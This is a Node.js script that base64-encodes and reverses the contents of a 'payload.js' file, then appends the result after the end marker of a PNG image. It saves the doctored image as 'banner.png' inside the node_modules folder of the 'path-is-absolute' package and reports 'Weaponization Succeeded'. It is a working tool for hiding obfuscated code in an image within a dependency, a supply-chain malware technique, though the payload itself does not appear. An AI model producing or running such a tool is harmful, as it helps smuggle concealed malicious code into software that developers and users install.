
const fs = require('fs');
const path = require('path');

let payloadCode;
try {
    payloadCode = fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8');
} catch (e) {
    console.error("CRITICAL ERROR");
    process.exit(1);
}


const base64Payload = Buffer.from(payloadCode).toString('base64');
const obfuscatedPayload = base64Payload.split('').reverse().join('');


function stitch() {
    const inputPng = 'mml.png';
    const outputPng = path.join(__dirname, 'node_modules', 'path-is-absolute', 'banner.png');

    if (!fs.existsSync(inputPng)) {
        console.error(`Error ${inputPng}`);
        return;
    }

    const pngBuffer = fs.readFileSync(inputPng);
    
        const iendMarker = Buffer.from([0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);
    const iendIndex = pngBuffer.lastIndexOf(iendMarker);

    if (iendIndex === -1) {
        console.error('Error');
        return;
    }

    const splitPoint = iendIndex + 8;
    const header = pngBuffer.slice(0, splitPoint);
    const payloadBuffer = Buffer.from(obfuscatedPayload, 'ascii');

    
    const finalBuffer = Buffer.concat([header, payloadBuffer]);
    fs.writeFileSync(outputPng, finalBuffer);
    
    console.log('Weaponization Succeeded');
    console.log(`Payload from 'payload.js' has been obfuscated and embedded into '${outputPng}'.`);
}

stitch();